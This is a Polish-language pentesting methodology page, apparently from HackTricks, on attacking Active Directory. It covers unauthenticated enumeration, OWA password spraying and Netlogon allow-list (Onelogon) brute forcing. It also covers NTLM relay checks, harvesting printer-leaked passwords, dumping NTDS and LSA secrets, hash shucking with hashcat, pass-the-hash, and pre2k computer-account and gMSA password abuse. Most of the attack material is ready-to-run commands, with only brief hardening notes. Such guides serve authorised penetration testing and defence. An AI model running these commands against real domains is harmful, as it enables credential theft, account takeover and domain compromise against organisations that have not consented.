# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** pełni funkcję podstawowej technologii, umożliwiając **administratorom sieci** efektywne tworzenie i zarządzanie **domenami**, **użytkownikami** oraz **obiektami** w sieci. Został zaprojektowany z myślą o skalowaniu, ułatwiając organizowanie dużej liczby użytkowników w możliwe do zarządzania **grupy** i **podgrupy**, a także kontrolowanie **uprawnień dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domen**, **drzew** i **lasów**. **Domena** obejmuje zbiór obiektów, takich jak **użytkownicy** lub **urządzenia**, współdzielących wspólną bazę danych. **Drzewa** to grupy tych domen połączonych wspólną strukturą, a **las** reprezentuje zbiór wielu drzew połączonych za pomocą **relacji zaufania**, tworząc najwyższą warstwę struktury organizacyjnej. Na każdym z tych poziomów można określić konkretne prawa **dostępu** i **komunikacji**.

Najważniejsze pojęcia związane z **Active Directory** obejmują:

1. **Katalog** – przechowuje wszystkie informacje dotyczące obiektów Active Directory.
2. **Obiekt** – oznacza jednostki znajdujące się w katalogu, w tym **użytkowników**, **grupy** lub **foldery udostępnione**.
3. **Domena** – służy jako kontener dla obiektów katalogu; wiele domen może współistnieć w obrębie **lasu**, a każda z nich utrzymuje własny zbiór obiektów.
4. **Drzewo** – grupa domen współdzielących wspólną domenę główną.
5. **Las** – najwyższy poziom struktury organizacyjnej w Active Directory, składający się z kilku drzew połączonych między sobą **relacjami zaufania**.

**Active Directory Domain Services (AD DS)** obejmuje szereg usług kluczowych dla scentralizowanego zarządzania siecią i komunikacji w jej obrębie. Usługi te obejmują:

1. **Domain Services** – centralizuje przechowywanie danych i zarządza interakcjami między **użytkownikami** a **domenami**, w tym funkcjami **uwierzytelniania** i **wyszukiwania**.
2. **Certificate Services** – nadzoruje tworzenie, dystrybucję i zarządzanie bezpiecznymi **certyfikatami cyfrowymi**.
3. **Lightweight Directory Services** – obsługuje aplikacje korzystające z katalogów za pośrednictwem **protokołu LDAP**.
4. **Directory Federation Services** – zapewnia funkcję **single sign-on**, umożliwiając uwierzytelnianie użytkowników w wielu aplikacjach webowych w ramach jednej sesji.
5. **Rights Management** – pomaga chronić materiały objęte prawami autorskimi poprzez regulowanie ich nieautoryzowanej dystrybucji i użycia.
6. **DNS Service** – ma kluczowe znaczenie dla rozwiązywania **nazw domen**.

Bardziej szczegółowe wyjaśnienie znajdziesz tutaj: [**TechTerms - definicja Active Directory**](https://techterms.com/definition/active_directory)

### **Uwierzytelnianie Kerberos**

Aby nauczyć się, jak **atakować AD**, musisz bardzo dobrze **zrozumieć proces uwierzytelniania Kerberos**.\
[**Przeczytaj tę stronę, jeśli nadal nie wiesz, jak to działa.**](kerberos-authentication.md)

## Ściągawka

Możesz skorzystać ze strony [https://wadcoms.github.io/](https://wadcoms.github.io), aby szybko sprawdzić, jakie polecenia możesz uruchomić w celu enumeracji/wykorzystania AD.

> [!WARNING]
> Komunikacja Kerberos zwykle **wymaga w pełni kwalifikowanej nazwy domenowej (FQDN)**, aby klient mógł uzyskać ticket dla właściwego SPN. Dostęp do maszyny za pomocą adresu IP często powoduje przejście na NTLM zamiast Kerberos.

## Rekonesans Active Directory (bez danych uwierzytelniających/sesji)

Jeśli masz dostęp do środowiska AD, ale nie posiadasz żadnych danych uwierzytelniających ani sesji, możesz:

- **Wykonać pentest sieci:**
- Przeskanować sieć, znaleźć maszyny i otwarte porty, a następnie spróbować **wykorzystać podatności** lub **wyodrębnić dane uwierzytelniające** z tych maszyn (na przykład [drukarki mogą być bardzo interesującymi celami](ad-information-in-printers.md)).
- Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak serwery webowe, drukarki, udziały, vpn, multimedia itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Zajrzyj do ogólnej [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby znaleźć więcej informacji o tym, jak to zrobić.
- **Sprawdź dostęp null i Guest w usługach smb** (nie zadziała to w nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bardziej szczegółowy przewodnik dotyczący enumeracji serwera SMB znajdziesz tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Bardziej szczegółowy przewodnik dotyczący enumeracji LDAP znajdziesz tutaj (zwróć **szczególną uwagę na dostęp anonimowy**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatruj sieć**
- Zbierz dane uwierzytelniające, [**podszywając się pod usługi za pomocą Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskaj dostęp do hosta, [**wykorzystując relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Zbierz dane uwierzytelniające, **udostępniając** [**fałszywe usługi UPnP za pomocą evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wyodrębnij nazwy użytkowników/imiona i nazwiska z wewnętrznych dokumentów, mediów społecznościowych i usług (głównie webowych) w środowiskach domenowych, a także z publicznie dostępnych źródeł.
- Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz wypróbować różne **konwencje nazw użytkowników AD (**[**przeczytaj to**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najczęściej spotykane konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery każdego elementu), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
- Narzędzia:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonimowa enumeracja SMB/LDAP:** sprawdź strony dotyczące [**pentestingu SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentestingu LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeracja Kerbrute**: Gdy żądana jest **nieprawidłowa nazwa użytkownika**, serwer odpowie kodem błędu **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala określić, że nazwa użytkownika była nieprawidłowa. W przypadku **prawidłowych nazw użytkowników** otrzymamy albo **TGT** w odpowiedzi AS-REP, albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi wykonać pre-authentication.
- **Brak uwierzytelniania w MS-NRPC**: użycie auth-level = 1 (brak uwierzytelniania) wobec interfejsu MS-NRPC (Netlogon) na kontrolerach domeny. Metoda wywołuje funkcję `DsrGetDcNameEx2` po powiązaniu z interfejsem MS-NRPC, aby sprawdzić, czy użytkownik lub komputer istnieje, bez użycia jakichkolwiek danych uwierzytelniających. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje ten typ enumeracji. Badanie można znaleźć [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Serwer OWA (Outlook Web Access)**

Jeśli znajdziesz jeden z tych serwerów w sieci, możesz również przeprowadzić **enumerację użytkowników**. Możesz na przykład użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Listy nazw użytkowników znajdziesz w [**tym repozytorium github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) oraz w tym ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak na etapie recon powinieneś mieć **nazwiska osób pracujących w firmie**, który należało wykonać wcześniej. Mając imię i nazwisko, możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) do wygenerowania potencjalnie prawidłowych nazw użytkowników.

### Nadużycie allow-listy podatnego kanału Netlogon (Onelogon)

Nawet po załataniu **Zerologon** na DC konta jawnie umieszczone na allow-liście nadal mogą być narażone na **legacy/podatne zachowanie bezpiecznego kanału Netlogon**. Ryzykowną konfiguracją jest GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** lub odpowiadająca mu wartość rejestru **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta wartość jest **deskryptorem zabezpieczeń SDDL** (zobacz [Deskryptory zabezpieczeń](security-descriptors.md)). Każde konto lub grupa, której przyznano odpowiedni ACE w DACL, może być celem ataku. Na przykład `O:BAG:BAD:(A;;RC;;;WD)` skutecznie umieszcza **Everyone** na allow-liście.

Praktyczny workflow operatora:

1. **Zidentyfikuj principalów na allow-liście**, sprawdzając zarówno **SYSVOL/GPO**, jak i **aktywny rejestr DC**.
2. **Rozwiąż SID-y** znalezione w SDDL do rzeczywistych użytkowników/komputerów AD i nadaj priorytet **kontom komputerów DC**, **kontom zaufania** oraz innym uprzywilejowanym komputerom.
3. Wielokrotnie próbuj **uwierzytelniania MS-NRPC / Netlogon** jako konto znajdujące się na allow-liście.
4. Po pomyślnym odgadnięciu hasła wykorzystaj **ustawianie haseł Netlogon**, aby zresetować hasło konta docelowego (publiczny PoC ustawia je na pusty ciąg).<sup>[[9]](#references)[[10]](#references)</sup>

Szybki triage / przykłady laboratoryjne z publicznego artefaktu:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Uwagi:

- **scanner** jest przydatny, ponieważ efektywna allow-list może znajdować się w **SYSVOL**, w **registry** albo w obu tych miejscach.
- Sama ścieżka exploit jest istotna, ponieważ po zidentyfikowaniu podatnego konta **nie wymaga uprawnień Domain Admin**.
- Przejęcie **konta komputera Domain Controller**, takiego jak `DC$`, jest szczególnie niebezpieczne, ponieważ zresetowanie tego hasła może bezpośrednio umożliwić szersze ścieżki **przejęcia AD**.
- **Wykonalność brute force** zależy od trybu: publiczny artefakt opisuje podejście meet-in-the-middle, **24-bitowy** brute force, gdy dostępne jest inne konto komputera, oraz wolniejsze warianty **32-bitowe**.

Uwagi dotyczące wykrywania / hardeningu:

- Przeprowadź audyt polityki allow-list i usuń wszystko poza tymczasowymi, wyraźnie wymaganymi wyjątkami kompatybilności.
- Monitoruj zdarzenia **System** na DC: **5827/5828/5829/5830/5831**, aby wykrywać odrzucane, wykryte lub jawnie dozwolone przez politykę podatne połączenia Netlogon.
- Traktuj konta znajdujące się w `VulnerableChannelAllowList` jako **wysokiego ryzyka**, dopóki zależność od legacy nie zostanie usunięta.

### Znajomość jednej lub kilku nazw użytkowników

Dobrze, masz już prawidłową nazwę użytkownika, ale nie masz żadnych haseł... W takim razie spróbuj:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_, możesz **zażądać wiadomości AS_REP** dla tego użytkownika, która będzie zawierać dane zaszyfrowane przy użyciu pochodnej hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Spróbujmy użyć **najczęstszych haseł** dla każdego z wykrytych użytkowników; być może któryś z nich używa słabego hasła (pamiętaj o polityce haseł!).
- Pamiętaj, że możesz również wykonać **spray na serwerach OWA**, aby spróbować uzyskać dostęp do serwerów pocztowych użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Możesz być w stanie **uzyskać** pewne **hashes** challenge, wykonując **poisoning** niektórych protokołów **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Enumeracja Active Directory dostarcza nazw użytkowników, identyfikatory e-mail i wzorce nazewnictwa, potencjalne hosty oraz usługi, które można zmusić do uwierzytelnienia. Wykorzystaj te informacje do identyfikacji możliwych [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM oraz potencjalnych ścieżek do środowiska AD.

### Rozpoznanie NetExec oparte na workspace oraz sprawdzanie konfiguracji relay

- Używaj **workspace `nxcdb`**, aby przechowywać stan rozpoznania AD osobno dla każdego zlecenia: `workspace create <name>` tworzy osobne bazy SQLite dla poszczególnych protokołów w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Przełączaj widoki za pomocą `proto smb|mssql|winrm`, a zebrane sekrety wyświetlaj poleceniem `creds`. Po zakończeniu ręcznie usuń wrażliwe dane: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Szybkie wykrywanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domenę**, **kompilację systemu operacyjnego**, **wymagania dotyczące podpisywania SMB** oraz **Null Auth**. Członkowie pokazujący `(signing:False)` są **podatni na relay**, podczas gdy DC często wymagają podpisywania.
- Generuj **nazwy hostów w /etc/hosts** bezpośrednio z wyników NetExec, aby ułatwić targetowanie:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Gdy **SMB relay do DC jest blokowany** przez signing, nadal sprawdzaj konfigurację **LDAP**: `netexec ldap <dc>` wskazuje `(signing:None)` / słabe channel binding. DC z wymaganym SMB signing, ale wyłączonym LDAP signing, nadal jest podatnym celem **relay-to-LDAP** dla nadużyć takich jak **SPN-less RBCD**.

### Wycieki poświadczeń drukarek po stronie klienta → masowa walidacja poświadczeń domenowych

- Interfejsy webowe drukarek czasami **umieszczają zamaskowane hasła administratora w HTML**. Wyświetlenie źródła strony lub użycie narzędzi deweloperskich może ujawnić tekst jawny (np. `<input value="<password>">`), umożliwiając dostęp Basic-auth do repozytoriów skanów/wydruków.
- Pobrane zadania drukowania mogą zawierać **dokumenty onboardingowe w postaci tekstu jawnego** z hasłami poszczególnych użytkowników. Podczas testów zachowuj zgodność par:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów** za pomocą **null lub guest user**, możesz **umieścić pliki** (takie jak plik SCF), które po uzyskaniu do nich dostępu **wyzwolą uwierzytelnianie NTLM przeciwko tobie**, dzięki czemu będziesz mógł **ukraść** **wyzwanie NTLM** i je złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** traktuje każdy posiadany hash NT jako hasło kandydujące dla innych, wolniejszych formatów, których materiał kluczowy jest bezpośrednio wyprowadzany z hasha NT. Zamiast brute-force'ować długie passphrase w ticketach Kerberos RC4, challenge'ach NetNTLM lub cached credentials, przekazujesz hashe NT do trybów NT-candidate w Hashcat i pozwalasz mu zweryfikować ponowne użycie hasła bez poznawania plaintextu. Jest to szczególnie skuteczne po przejęciu domeny, gdy możesz zebrać tysiące aktualnych i historycznych hashy NT.<sup>[[5]](#references)</sup>

Użyj shucking, gdy:

- Masz zbiór NT z DCSync, zrzutów SAM/SECURITY lub credential vaults i musisz sprawdzić ponowne użycie w innych domenach/lasach.
- Przechwycisz materiał Kerberos oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM lub bloby DCC/DCC2.
- Chcesz szybko potwierdzić ponowne użycie długich, niemożliwych do złamania passphrase i natychmiast wykonać pivot za pomocą Pass-the-Hash.

Technika **nie działa** przeciwko typom szyfrowania, których klucze nie są hashem NT (np. Kerberos etype 17/18 AES). Jeśli domena wymusza wyłącznie AES, musisz powrócić do zwykłych trybów haseł.

#### Tworzenie zbioru hashy NT

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby pobrać możliwie największy zestaw hashy NT (wraz z ich poprzednimi wartościami):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Wpisy historii znacznie poszerzają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy dla każdego konta. Więcej sposobów na pozyskiwanie sekretów NTDS znajdziesz tutaj:

{{#ref}}
dcsync.md
{{#endref}}

- **Zrzuty cache endpointów** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wyodrębnia lokalne dane SAM/SECURITY oraz cached domain logons (DCC/DCC2). Usuń duplikaty i dodaj te hashe do tej samej listy `nt_candidates.txt`.
- **Śledź metadane** – Zachowaj nazwę użytkownika/domenę, z których pochodzi każdy hash (nawet jeśli wordlist zawiera wyłącznie wartości hex). Dopasowane hashe natychmiast pokażą, który principal ponownie używa hasła, gdy Hashcat wyświetli zwycięskiego kandydata.
- Preferuj kandydatów z tego samego lasu lub z zaufanego lasu; maksymalizuje to szansę na znalezienie nakładania się hashy podczas shucking.

#### Tryby NT-candidate w Hashcat

| Typ hasha                                | Tryb hasła | Tryb NT-candidate |
| ---------------------------------------- | ---------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100       | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100       | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500       | 27000             |
| NetNTLMv2                                | 5600       | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500       | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100      | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200      | 35400             |

Uwagi:

- Wejścia NT-candidate **muszą pozostać surowymi hashami NT w formacie 32 znaków hex**. Wyłącz rule engines (bez `-r` i bez trybów hybrydowych), ponieważ modyfikowanie psuje materiał kluczowy kandydata.
- Tryby te nie są z natury szybsze, ale keyspace NTLM (~30 000 MH/s na M3 Max) jest ~100× szybszy niż Kerberos RC4 (~300 MH/s). Testowanie wyselekcjonowanej listy NT jest znacznie tańsze niż przeszukiwanie całej przestrzeni haseł w wolnym formacie.
- Zawsze uruchamiaj **najnowszy build Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), ponieważ tryby 31500/31600/35300/35400 zostały dodane niedawno.<sup>[[7]](#references)</sup>
- Obecnie nie istnieje tryb NT dla AS-REQ Pre-Auth, a typy AES (19600/19700) wymagają plaintextu hasła, ponieważ ich klucze są wyprowadzane za pomocą PBKDF2 z haseł UTF-16LE, a nie z surowych hashy NT.

#### Example – Kerberoast RC4 (mode 35300)

1. Przechwyć RC4 TGS dla docelowego SPN za pomocą użytkownika z niskimi uprawnieniami (szczegóły znajdziesz na stronie Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Wykonaj shuck ticketu za pomocą listy NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat wyprowadza klucz RC4 z każdego kandydata NT i weryfikuje blob `$krb5tgs$23$...`. Dopasowanie potwierdza, że konto usługi używa jednego z posiadanych hashy NT.

3. Natychmiast wykonaj pivot za pomocą PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcjonalnie możesz później odzyskać plaintext za pomocą `hashcat -m 1000 <matched_hash> wordlists/`, jeśli będzie potrzebny.

#### Example – Cached credentials (mode 31600)

1. Zrzuć cached logons z przejętej stacji roboczej:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Skopiuj linię DCC2 dotyczącą interesującego użytkownika domeny do `dcc2_highpriv.txt` i wykonaj shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Pomyślne dopasowanie zwraca hash NT już znany na liście, potwierdzając, że użytkownik zapisany w cache ponownie używa hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) albo wykonaj brute-force w szybkim trybie NTLM, aby odzyskać ciąg znaków.

Dokładnie ten sam workflow dotyczy challenge-response NetNTLM (`-m 27000/27100`) oraz DCC (`-m 31500`). Po zidentyfikowaniu dopasowania możesz uruchomić relay, SMB/WMI/WinRM PtH albo ponownie złamać hash NT offline za pomocą masek/reguł.



## Enumerating Active Directory Z credentials/session

Na tym etapie musisz mieć **przejęte credentials lub sesję prawidłowego konta domenowego**. Jeśli masz prawidłowe credentials lub shell jako użytkownik domeny, **pamiętaj, że wcześniej przedstawione opcje nadal mogą posłużyć do przejęcia innych użytkowników**.

Przed rozpoczęciem uwierzytelnionej enumeracji zapoznaj się z **problemem Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Przejęcie konta jest **ważnym krokiem w ocenie domeny**, ponieważ umożliwia uwierzytelnioną **enumerację Active Directory**:

W przypadku [**ASREPRoast**](asreproast.md) możesz teraz znaleźć każdego potencjalnie podatnego użytkownika, a w przypadku [**Password Spraying**](password-spraying.md) możesz uzyskać **listę wszystkich nazw użytkowników** i wypróbować hasło przejętego konta, puste hasła oraz nowe, obiecujące hasła.

- Możesz użyć [**CMD do przeprowadzenia podstawowego recon**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz także użyć [**powershell do recon**](../basic-powershell-for-pentesters/index.html), co będzie bardziej stealthy
- Możesz również [**użyć powerview**](../basic-powershell-for-pentesters/powerview.md), aby wyodrębnić bardziej szczegółowe informacje
- Kolejnym świetnym narzędziem do recon w active directory jest [**BloodHound**](bloodhound.md). Jest **mało stealthy** (zależnie od używanych metod collection), ale **jeśli ci to nie przeszkadza**, zdecydowanie warto go wypróbować. Znajdź, gdzie użytkownicy mogą korzystać z RDP, ścieżki do innych grup itd.
- **Inne zautomatyzowane narzędzia do enumeracji AD to:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Rekordy DNS AD**](ad-dns-records.md), ponieważ mogą zawierać interesujące informacje.
- **AdExplorer.exe** z pakietu **SysInternal** Suite to **narzędzie z GUI**, którego możesz użyć do enumeracji katalogu.
- Możesz także przeszukiwać bazę LDAP za pomocą **ldapsearch**, aby znaleźć credentials w polach _userPassword_ i _unixUserPassword_, a nawet w polu _Description_. Zobacz [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment), aby poznać inne metody.
- Jeśli używasz **Linux**, możesz również enumerować domenę za pomocą [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz także wypróbować zautomatyzowane narzędzia, takie jak:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Wyodrębnianie wszystkich użytkowników domeny**

Bardzo łatwo uzyskać wszystkie nazwy użytkowników domeny z Windows (`net user /domain`, `Get-DomainUser` lub `wmic useraccount get name,sid`). W Linux możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Nawet jeśli ta sekcja Enumeration wygląda na krótką, jest to najważniejsza część całości. Otwórz linki (głównie te dotyczące cmd, powershell, powerview i BloodHound), naucz się enumerować domenę i ćwicz, aż poczujesz się swobodnie. Podczas assessmentu będzie to kluczowy moment, aby znaleźć drogę do DA albo zdecydować, że nic nie da się zrobić.

### Predictable pre-created computer accounts -> gMSA password access

Computer accounts przygotowane na potrzeby starszych joinów mogą zachować przewidywalne początkowe hasło. Moduł `pre2k` w NetExec identyfikuje charakterystyczną wartość `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) i próbuje uzyskać Kerberos TGT przy użyciu pierwszych 14 znaków nazwy komputera zapisanych małymi literami, bez końcowego `$`. Traktuj tę wartość UAC jako selektor kandydatów, zamiast zakładać, że sama przynależność do **Pre-Windows 2000 Compatible Access** dowodzi słabości hasła.<sup>[[18]](#references)[[20]](#references)</sup>

Użyj uwierzytelnionej enumeracji LDAP, aby przetestować kandydatów i zapisać pomyślnie uzyskane TGT. `ALL=True` rozszerza testowanie poza obiekty pasujące do domyślnego filtra `4128`.<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
Nieudane domyślne powiązanie/NTLM bind **nie** unieważnia tego ustalenia: testuj z `-k`, używając FQDN, który rozwiązuje się do DC, oraz zegara zsynchronizowanego z KDC. Pomyślne uruchomienia modułu zapisują listy kandydatów i pozyskane ccaches w `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Po przejęciu computer principal przeanalizuj jego zagnieżdżone członkostwa w grupach oraz uprawnienia wychodzące. W szczególności principals wymienione w deskryptorze zabezpieczeń `msDS-GroupMSAMembership` obiektu gMSA mogą odczytywać `msDS-ManagedPassword`; dane wyjściowe `--gmsa` w NetExec pokazują dozwolone principals i zwracają bieżący NT hash, gdy uwierzytelniający computer jest upoważniony.<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
Następnie oceń odzyskane gMSA jak każde inne dane uwierzytelniające: sprawdź członkostwo w lokalnych i domenowych grupach, prawa logowania, SPN-y, delegowanie oraz dostępne usługi, zanim spróbujesz użyć pass-the-hash. Ta ścieżka odzyskiwania oparta na ACL różni się od [Golden gMSA/dMSA](golden-dmsa-gmsa.md), które uzyskuje zarządzane hasła po przejęciu klucza głównego KDS.<sup>[[20]](#references)</sup>

### Kerberoast

Kerberoasting polega na uzyskiwaniu **biletów TGS** używanych przez usługi powiązane z kontami użytkowników i łamaniu ich szyfrowania — opartego na hasłach użytkowników — **offline**.

Więcej informacji:


{{#ref}}
kerberoast.md
{{#endref}}

### Zdalne połączenie (RDP, SSH, FTP, Win-RM itd.)

Po uzyskaniu danych uwierzytelniających możesz sprawdzić, czy masz dostęp do dowolnej **maszyny**. W tym celu możesz użyć **CrackMapExec**, aby spróbować połączyć się z kilkoma serwerami za pomocą różnych protokołów, zgodnie z wynikami skanowania portów.

### Local Privilege Escalation

Jeśli przejąłeś dane uwierzytelniające lub sesję zwykłego użytkownika domenowego i możesz uzyskać dostęp do **dowolnej maszyny w domenie**, poszukaj sposobu na **lokalne podniesienie uprawnień i zebranie danych uwierzytelniających**. Uprawnienia lokalnego administratora mogą umożliwić **zrzucenie hashy innych użytkowników** z pamięci (LSASS) i lokalnego magazynu (SAM).

W tej książce znajduje się kompletna strona poświęcona [**local privilege escalation w systemie Windows**](../windows-local-privilege-escalation/index.html) oraz [**checklista**](../checklist-windows-privilege-escalation.md). Nie zapomnij także użyć narzędzia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Bilety bieżącej sesji

